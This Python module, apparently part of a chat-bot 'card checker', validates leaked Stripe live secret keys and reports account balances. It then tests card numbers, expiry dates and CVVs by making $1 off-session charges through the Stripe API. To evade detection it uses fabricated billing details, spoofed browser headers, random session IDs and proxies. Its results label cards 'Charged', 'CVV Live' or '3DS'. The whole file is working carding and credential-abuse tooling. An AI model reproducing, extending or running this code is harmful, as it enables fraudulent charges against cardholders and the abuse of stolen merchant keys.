# SK-Based Gate Engine - Stripe Direct PaymentIntents ($1.00)
import aiohttp
import asyncio
import re
import json
import random
import uuid
import sys
import httpx

def derive_pk_or_acct(sk_key, pk_key=None):
    if pk_key and pk_key.startswith('pk_live_'):
        acct_id = None
        if '_' in pk_key:
            raw = pk_key.split('_')[-1]
            if raw.startswith('51'):
                acct_id = 'acct_1' + raw[2:17]
            else:
                acct_id = 'acct_' + raw[:16]
        return pk_key, acct_id

    if not sk_key or not sk_key.startswith('sk_live_'):
        return pk_key, None

    raw_sk = sk_key.split('_')[-1]
    if raw_sk.startswith('51'):
        acct_id = 'acct_1' + raw_sk[2:17]
    else:
        acct_id = 'acct_' + raw_sk[:16]
    
    derived_pk = pk_key or ('pk_live_' + raw_sk)
    return derived_pk, acct_id

async def validate_stripe_sk(sk_key, pk_key=None):
    sk_key = sk_key.strip()
    if not sk_key.startswith('sk_live_'):
        return False, 'Invalid Key Format', None

    derived_pk, acct_id = derive_pk_or_acct(sk_key, pk_key)
    headers = {'Authorization': 'Bearer ' + sk_key, 'User-Agent': 'Mozilla/5.0'}

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api.stripe.com/v1/balance', headers=headers, timeout=10) as resp:
                bal_json = await resp.json()
                if resp.status == 200:
                    acc_json = {}
                    try:
                        async with session.get('https://api.stripe.com/v1/account', headers=headers, timeout=10) as acc_resp:
                            if acc_resp.status == 200:
                                acc_json = await acc_resp.json()
                    except Exception:
                        pass

                    avail_list = bal_json.get('available', [{}])
                    pend_list = bal_json.get('pending', [{}])
                    
                    avail_item = avail_list[0] if avail_list else {}
                    pend_item = pend_list[0] if pend_list else {}

                    currency = str(avail_item.get('currency', 'usd')).upper()
                    avail_amt = float(avail_item.get('amount', 0)) / 100.0
                    pend_amt = float(pend_item.get('amount', 0)) / 100.0

                    acc_id = acc_json.get('id') or acct_id
                    country = acc_json.get('country', 'US')
                    
                    info = {
                        'sk': sk_key,
                        'pk': derived_pk,
                        'account_id': acc_id,
                        'country': country,
                        'currency': currency,
                        'available': f'{avail_amt:.2f} {currency}',
                        'pending': f'{pend_amt:.2f} {currency}'
                    }
                    return True, 'LIVE & ACTIVE 🟢', info
                else:
                    err_msg = (bal_json.get('error') or {}).get('message', 'Expired or Invalid SK Key')
                    return False, 'DEAD 🔴 (' + err_msg + ')', None
    except Exception as e:
        return False, 'Error checking key: ' + str(e), None

async def skintoff_engine(session, cc, mm, yy, cvv, sk_key, pk_key):
    max_amt = 0
    max_retry = 3
    derived_pk, acct_id = derive_pk_or_acct(sk_key, pk_key)

    url = 'https://api.stripe.com/v1/payment_methods'
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }

    if acct_id:
        headers['Stripe-Account'] = acct_id

    data = {
        'type': 'card',
        'key': derived_pk,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'billing_details[name]': 'Ayan XD',
        'billing_details[address][city]': 'Los Angeles',
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': '1234 Street',
        'billing_details[address][postal_code]': '90001',
        'billing_details[address][state]': 'CA',
        'guid': str(uuid.uuid4()),
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
        'payment_user_agent': 'stripe.js/split-card-element',
        'time_on_page': random.randint(10021, 10090),
    }

    if acct_id:
        data['_stripe_account'] = acct_id

    attempts = 0
    while True:
        if attempts >= max_retry:
            return 'Max retry reached due to connection issues (payment_methods)'

        try:
            result = await session.post(url=url, headers=headers, data=data)
        except Exception:
            attempts += 1
            continue

        text = result.text
        if 'Invalid API Key provided' in text:
            return 'Invalid API Key'
        if 'api_key_expired' in text:
            return 'API Key Expired'
        if 'Your account cannot currently make live charges.' in text:
            return 'Account Cannot Make Live Charges'

        if 'Request rate limit exceeded.' in text:
            max_amt += 1
            if max_amt == max_retry:
                return '429 Too Many Requests'
            continue
        else:
            break

    try:
        response_json = result.json()
        payment_method_id = response_json.get('id')
        if not payment_method_id:
            err_msg = response_json.get('error', {}).get('message', 'Unexpected response')
            return f'[Step 1 Error] {err_msg}'
    except Exception:
        return 'Unexpected response (no ID)'

    url = 'https://api.stripe.com/v1/payment_intents'
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US',
        'content-type': 'application/x-www-form-urlencoded',
        'Authorization': f'Bearer {sk_key}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }

    data = {
        'amount': 100,
        'currency': 'usd',
        'payment_method_types[]': 'card',
        'payment_method': payment_method_id,
        'confirm': 'true',
        'off_session': 'true',
        'use_stripe_sdk': 'true',
        'description': 'None',
        'receipt_email': 'xhfuhuduburyg@gmail.com',
        'metadata[order_id]': str(random.randint(100000000000000000, 999999999999999999)),
    }

    attempts = 0
    while True:
        if attempts >= max_retry:
            return 'Max retry reached due to connection issues (payment_intents)'

        try:
            response = await session.post(url=url, headers=headers, data=data)
        except Exception:
            attempts += 1
            continue

        text = response.text
        if 'Invalid API Key provided' in text:
            return 'Invalid API Key'
        if 'api_key_expired' in text:
            return 'API Key Expired'

        if 'Request rate limit exceeded.' in text:
            max_amt += 1
            if max_amt == max_retry:
                return '429 Too Many Requests'
            continue
        else:
            break

    try:
        json_res = response.json()
        if 'requires_action' in text or 'requires_source_action' in text:
            return '3D Secure Required'
        if '"cvc_check": "pass"' in text or '"cvc_check":"pass"' in text:
            return 'CVV Live'
        if 'error' in text:
            if 'decline_code' in json_res['error']:
                return json_res['error']['decline_code'].replace('_', ' ').title()
            else:
                return json_res['error']['message']
        elif 'succeeded' in text or (json_res.get('status') == 'succeeded') or 'success:true' in text:
            return 'Charged $1'
        else:
            return 'Unexpected response'
    except Exception:
        return 'Unexpected response'

async def check_card_sk(cc, mm, yy, cvc, sk_key=None, pk_key=None, proxy_url=None, user_id=None):
    if not sk_key or not pk_key:
        if user_id:
            try:
                from extra_tools import get_user_sk
                sk_data = get_user_sk(user_id)
                if sk_data and isinstance(sk_data, dict):
                    sk_key = sk_key or sk_data.get('sk')
                    pk_key = pk_key or sk_data.get('pk')
            except Exception:
                pass

    if not sk_key:
        return False, 'NO KEYS ⚠️', 'Please add an active SK key using /sk command', ''

    derived_pk, acct_id = derive_pk_or_acct(sk_key, pk_key)

    try:
        try:
            async with httpx.AsyncClient(proxy=proxy_url if proxy_url else None, timeout=20.0) as session:
                res_str = await skintoff_engine(session, cc, mm, yy, cvc, sk_key=sk_key, pk_key=derived_pk)
        except Exception as pe:
            if 'socks' in str(pe).lower() or 'proxy' in str(pe).lower():
                async with httpx.AsyncClient(timeout=20.0) as session:
                    res_str = await skintoff_engine(session, cc, mm, yy, cvc, sk_key=sk_key, pk_key=derived_pk)
            else:
                raise pe
            
        res_lower = str(res_str).lower()
        if 'charged' in res_lower or 'succeeded' in res_lower:
            return True, 'Charged! 🟢', res_str, res_str
        elif 'cvv live' in res_lower or 'insufficient' in res_lower or 'approved' in res_lower:
            return True, 'Approved! ✅', res_str, res_str
        elif '3d secure' in res_lower:
            return False, 'Live! 🟡 (3DS)', res_str, res_str
        else:
            return False, 'Declined! ❌', res_str, res_str
    except Exception as e:
        return False, 'ERROR ⚠️', str(e), ''
